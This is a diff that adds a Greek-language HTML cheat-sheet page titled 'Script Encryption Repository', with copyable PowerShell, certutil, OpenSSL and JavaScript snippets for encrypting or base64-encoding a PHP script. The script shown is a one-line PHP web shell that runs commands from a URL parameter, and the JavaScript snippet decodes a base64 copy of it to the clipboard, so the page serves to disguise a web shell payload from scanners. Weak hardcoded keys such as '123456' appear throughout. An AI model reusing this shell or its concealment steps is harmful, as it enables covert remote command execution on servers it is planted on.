@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Utility | Cyber Book</title>
+    <link rel="stylesheet" href="crypt.css">
+</head>
+<body>
+
+    <div class="wrapper">
+        <a href="index.html" class="back-link">← index</a>
+        
+        <header>
+            <h1>Script Encryption Repository</h1>
+            <p style="color: var(--text-color); font-size: 0.95rem; margin-top: 5px;">Επίλεξε πλατφόρμα για να δεις τις μεθόδους κρυπτογράφησης.</p>
+        </header>
+
+        <!-- ΜΠΑΡΑ ΚΑΤΗΓΟΡΙΩΝ (TABS) -->
+        <div class="tab-menu">
+            <button class="tab-btn active" data-tab="windows">🪟 Windows</button>
+            <button class="tab-btn" data-tab="linux">🐧 Linux</button>
+            <button class="tab-btn" data-tab="javascript">🌐 JavaScript</button>
+        </div>
+
+        <!-- ==================== CATEGORY: WINDOWS ==================== -->
+        <div id="windows" class="tab-panel active">
+            <!-- PowerShell Method -->
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>PowerShell (AES-256 Encrypt & Save)</span>
+                    <button class="mini-copy" onclick="copyCode('win-ps-enc')">Copy</button>
+                </div>
+                <pre id="win-ps-enc"><span class="comment"># Κλείδωμα κειμένου σε αρχείο στο Desktop</span>
+$text = "<span class="highlight">&lt;?php system($_GET['cmd']); ?&gt;</span>"
+$key = [byte[]]([System.Text.Encoding]::UTF8.GetBytes("<span class="highlight">12345600000000000000000000000000</span>"))
+$secureString = ConvertTo-SecureString $text -AsPlainText -Force
+$encrypted = ConvertFrom-SecureString $secureString -Key $key
+$encrypted | Out-File -FilePath "$env:USERPROFILE\Desktop\encrypted.txt"</pre>
+            </div>
+
+            <!-- CMD Method -->
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>CMD / Command Prompt (Base64 Encrypt File)</span>
+                    <button class="mini-copy" onclick="copyCode('win-cmd-enc')">Copy</button>
+                </div>
+                <pre id="win-cmd-enc"><span class="comment"># Κωδικοποίηση αρχείου με το ενσωματωμένο certutil των Windows</span>
+certutil -encode <span class="highlight">script.php</span> encrypted.txt</pre>
+            </div>
+            
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>CMD / Command Prompt (Base64 Decrypt File)</span>
+                    <button class="mini-copy" onclick="copyCode('win-cmd-dec')">Copy</button>
+                </div>
+                <pre id="win-cmd-dec"><span class="comment"># Αποκωδικοποίηση αρχείου πίσω στην αρχική μορφή</span>
+certutil -decode encrypted.txt <span class="highlight">decrypted.php</span></pre>
+            </div>
+        </div>
+
+        <!-- ==================== CATEGORY: LINUX ==================== -->
+        <div id="linux" class="tab-panel">
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>OpenSSL (AES-256 CBC Encrypt)</span>
+                    <button class="mini-copy" onclick="copyCode('lin-enc')">Copy</button>
+                </div>
+                <pre id="lin-enc"><span class="comment"># Κρυπτογράφηση αρχείου με OpenSSL (pbkdf2 για ασφάλεια)</span>
+openssl enc -aes-256-cbc -salt -in <span class="highlight">script.php</span> -out encrypted.enc -k <span class="highlight">123456</span> -pbkdf2</pre>
+            </div>
+
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>OpenSSL (AES-256 CBC Decrypt)</span>
+                    <button class="mini-copy" onclick="copyCode('lin-dec')">Copy</button>
+                </div>
+                <pre id="lin-dec"><span class="comment"># Αποκρυπτογράφηση και εμφάνιση κώδικα στο τερματικό</span>
+openssl enc -aes-256-cbc -d -in encrypted.enc -k <span class="highlight">123456</span> -pbkdf2</pre>
+            </div>
+        </div>
+
+        <!-- ==================== CATEGORY: JAVASCRIPT ==================== -->
+        <div id="javascript" class="tab-panel">
+            <div class="crypto-section">
+                <div class="section-title">
+                    <span>Web Crypto API (Browser Native Base64 Decode)</span>
+                    <button class="mini-copy" onclick="copyCode('js-b64')">Copy</button>
+                </div>
+                <pre id="js-b64"><span class="comment">// Αποκρυπτογράφηση Base64 "στον αέρα" και αντιγραφή στο clipboard</span>
+const payload = "<span class="highlight">PD9waHAgc3lzdGVtKCRf...</span>";
+navigator.clipboard.writeText(atob(payload));</pre>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- SCRIPT ΓΙΑ ΤΟ COPY ΚΑΙ ΤΗΝ ΑΛΛΑΓΗ ΤΩΝ ΚΑΤΗΓΟΡΙΩΝ -->
+    <script>
+        // Μηχανισμός αλλαγής κατηγοριών (Tabs)
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                // Αφαίρεση active από όλα τα κουμπιά και panels
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+                
+                // Ενεργοποίηση του σωστού κουμπιού και panel
+                btn.classList.add('active');
+                const target = btn.getAttribute('data-tab');
+                document.getElementById(target).classList.add('active');
+            });
+        });
+
+        // Συναρτηση Αντιγραφής
+        function copyCode(id) {
+            const text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text);
+            const btn = document.querySelector(`[onclick="copyCode('${id}')"]`);
+            btn.innerText = 'Copied';
+            setTimeout(() => btn.innerText = 'Copy', 1500);
+        }
+    </script>
+</body>
+</html>
